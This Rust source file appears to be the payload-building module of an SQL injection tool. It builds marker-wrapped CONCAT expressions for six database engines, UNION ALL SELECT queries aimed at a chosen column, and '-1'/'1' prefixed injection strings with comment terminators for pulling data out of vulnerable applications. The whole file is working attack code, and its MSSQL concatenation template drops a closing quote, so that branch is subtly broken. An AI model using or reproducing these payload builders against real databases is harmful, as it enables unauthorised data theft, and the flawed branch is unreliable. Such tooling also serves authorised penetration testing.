//! SQL Agent - Query building and manipulation

use super::enums::DBMS;
use super::settings::{CHAR_START, CHAR_STOP, CHAR_DELIMITER, NULL};

/// Agent for building SQL injection queries
pub struct Agent {
    pub dbms: DBMS,
    pub prefix: String,
    pub suffix: String,
    pub comment: String,
}

impl Agent {
    pub fn new(dbms: DBMS) -> Self {
        let comment = match dbms {
            DBMS::MySQL => "-- -",
            DBMS::PostgreSQL => "--",
            DBMS::MSSQL => "--",
            DBMS::Oracle => "--",
            DBMS::SQLite => "--",
            DBMS::Access => "",
            DBMS::Unknown => "-- -",
        };
        
        Self {
            dbms,
            prefix: String::new(),
            suffix: String::new(),
            comment: comment.to_string(),
        }
    }

    /// Build CONCAT expression with markers for field extraction
    /// MySQL: CONCAT('start', IFNULL(CAST(field AS CHAR), ' '), 'stop')
    pub fn concat_field(&self, field: &str) -> String {
        match self.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("CONCAT('{}',IFNULL(CAST({} AS CHAR),' '),'{}')", 
                    CHAR_START, field, CHAR_STOP)
            },
            DBMS::PostgreSQL => {
                format!("'{}'||COALESCE(CAST({} AS CHARACTER(10000)),' ')||'{}'",
                    CHAR_START, field, CHAR_STOP)
            },
            DBMS::MSSQL => {
                format!("'{}'+ISNULL(CAST({} AS VARCHAR(8000)),' ')+'{}",
                    CHAR_START, field, CHAR_STOP)
            },
            DBMS::Oracle => {
                format!("'{}'||NVL(CAST({} AS VARCHAR(4000)),' ')||'{}'",
                    CHAR_START, field, CHAR_STOP)
            },
            DBMS::SQLite => {
                format!("'{}'||IFNULL(CAST({} AS TEXT),' ')||'{}'",
                    CHAR_START, field, CHAR_STOP)
            },
            DBMS::Access => {
                format!("'{}'&IIF(ISNULL({}),'',({}))&'{}'",
                    CHAR_START, field, field, CHAR_STOP)
            },
        }
    }

    /// Build CONCAT expression with multiple fields separated by delimiter
    pub fn concat_fields(&self, fields: &[&str]) -> String {
        let parts: Vec<String> = fields.iter()
            .map(|f| format!("IFNULL(CAST({} AS CHAR),' ')", f))
            .collect();
        
        match self.dbms {
            DBMS::MySQL | DBMS::Unknown => {
                format!("CONCAT('{}',{},'{}')", 
                    CHAR_START, 
                    parts.join(&format!(",'{}',", CHAR_DELIMITER)),
                    CHAR_STOP)
            },
            DBMS::PostgreSQL => {
                let pg_parts: Vec<String> = fields.iter()
                    .map(|f| format!("COALESCE(CAST({} AS CHARACTER(10000)),' ')", f))
                    .collect();
                format!("'{}'||{}||'{}'",
                    CHAR_START,
                    pg_parts.join(&format!("||'{}'||", CHAR_DELIMITER)),
                    CHAR_STOP)
            },
            _ => {
                format!("CONCAT('{}',{},'{}')", 
                    CHAR_START, 
                    parts.join(&format!(",'{}',", CHAR_DELIMITER)),
                    CHAR_STOP)
            }
        }
    }

    /// Build UNION query
    /// position: which column to inject into (0-indexed)
    /// count: total number of columns
    pub fn forge_union_query(
        &self,
        expression: &str,
        position: usize,
        count: usize,
        from_table: Option<&str>,
    ) -> String {
        let mut columns: Vec<String> = vec![NULL.to_string(); count];
        columns[position] = expression.to_string();
        
        let union_part = format!("UNION ALL SELECT {}", columns.join(","));
        
        if let Some(table) = from_table {
            format!("{} FROM {} {}", union_part, table, self.comment)
        } else {
            format!("{} {}", union_part, self.comment)
        }
    }

    /// Build payload with prefix
    pub fn payload(&self, query: &str, where_type: super::enums::PayloadWhere) -> String {
        match where_type {
            super::enums::PayloadWhere::Negative => {
                format!("-1 {}", query)
            },
            super::enums::PayloadWhere::Original => {
                format!("1 {}", query)
            },
            super::enums::PayloadWhere::Replace => {
                query.to_string()
            },
        }
    }
}
